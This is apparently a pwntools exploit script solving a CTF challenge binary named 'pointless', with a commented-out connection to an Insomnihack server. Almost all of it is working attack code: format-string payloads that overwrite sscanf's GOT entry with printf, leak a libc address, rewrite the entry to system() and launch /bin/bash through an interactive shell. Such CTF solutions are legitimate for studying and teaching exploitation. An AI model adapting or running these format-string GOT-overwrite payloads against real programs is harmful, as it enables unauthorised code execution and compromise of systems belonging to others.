#!/usr/bin/env python3

from pwn import *

elf = ELF("./pointless", False)
libc = ELF("./libc.so.6", False)

# s = remote("vaulty.insomnihack.ch", 4556)
s = process(["./ld-linux-x86-64.so.2", elf.path], env={"LD_PRELOAD":"./libc.so.6"})
# s = process(elf.path)


def main():

	sscanf_got = elf.got['__isoc99_sscanf']
	printf_plt = elf.plt['printf']

	# print(f"sscanf.got: {hex(sscanf_got)}")
	# print(f"printf.plt: {hex(printf_plt)}")

	gdbscript = "\n".join([
		# "b *0x40124C",			# fgets(delim)
		"b *0x40145A",			# scanf(row)
	])
	# gdb.attach(s, gdbscript=gdbscript)

	s.info(f"Rewriting sscanf() on printf()...")

	payload = 	b"naaaaaaa" 			# size = 8
	payload += 	b''.join( f"%{i + 21}$s".encode() for i in range(8) )	# %21$s%22$s%23$s...
	payload += 	p64(sscanf_got + 7)		# 21-th on stack	< 	b'c\x00' 	(zeroing sscanf_got)
	payload += 	p64(sscanf_got + 6)		# 22-th on stack	< 	b'c\x00'	(zeroing sscanf_got)
	payload += 	p64(sscanf_got + 5)		# 23-th on stack	< 	b'c\x00'	(zeroing sscanf_got)
	payload += 	p64(sscanf_got + 4)		# 24-th on stack	< 	b'c\x00'	(zeroing sscanf_got)
	payload += 	p64(sscanf_got + 3)		# 25-th on stack	< 	b'c\x00'	(zeroing sscanf_got)
	payload += 	p64(sscanf_got + 2)		# 26-th on stack	< 	b'c\x00'	(zeroing sscanf_got)
	payload += 	p64(sscanf_got + 1)		# 27-th on stack	< 	b'c\x00'	(zeroing sscanf_got)
	payload += 	p64(sscanf_got + 0)		# 28-th on stack	< 	address
	# delim = %m[^n]naaaaaaa%21$s%22$s%23$s%24$s%25$s%26$s%27$s%28$s<p64(sscanf_got + 7)><p64(sscanf_got + 6)><p64(sscanf_got + 5)><p64(sscanf_got + 4)><p64(sscanf_got + 3)><p64(sscanf_got + 2)><p64(sscanf_got + 1)><p64(sscanf_got)>%n

	# pause()
	s.sendlineafter( b'delim> ', 	payload )
	s.sendlineafter( b'columns> ', 	b'1' )
	s.sendlineafter( b'rows> ', 	b'5' )		# 1-th sscanf, 2/3/4/5-th printf

	payload = 	b"anaaaaaaa"
	payload += 	b'c c c c c c c '	# zeroing sscanf_got
	payload += 	p64(printf_plt)		# payload to write
	s.sendline( payload )
	# sscanf(
	# 	anaaaaaaac c c c c c c <p64(printf_plt)>,
	# 	%m[^n]naaaaaaa%21$s%22$s%23$s%24$s%25$s%26$s%27$s%28$s<p64(sscanf_got + 7)><p64(sscanf_got + 6)><p64(sscanf_got + 5)><p64(sscanf_got + 4)><p64(sscanf_got + 3)><p64(sscanf_got + 2)><p64(sscanf_got + 1)><p64(sscanf_got)>%n,
	# 	...,
	# 	...
	# )
	
	s.success(f"Rewrited sscanf() on printf()")
	s.info(f"Leaking libc's base...")

	s.sendline( b'%37$p' )
	leak_libc = int( s.recvline(), 16 )
	libc_base = leak_libc - 0x2a1ca

	s.success(f"Leaked libc's base: {hex(libc_base)}")
	s.info(f"Rewriting printf() on system()...")

	system_addr = libc_base + libc.sym["system"]
	# print( hex(system_addr) )

	payload = b''
	base_stack_element = 22
	hhn = 0
	for i, byte in enumerate( p64(system_addr)[::-1] ):
		if byte == 0:
			continue

		# if byte != hhn:
		payload += f'%{(byte - hhn) % 256}c'.encode()
		payload += f'%{base_stack_element + i}$hhn'.encode()
		hhn = byte

	# print(payload)
	s.sendline( payload )
	s.sendline( b'/bin/bash' )

	s.interactive()


if __name__=="__main__":
	main()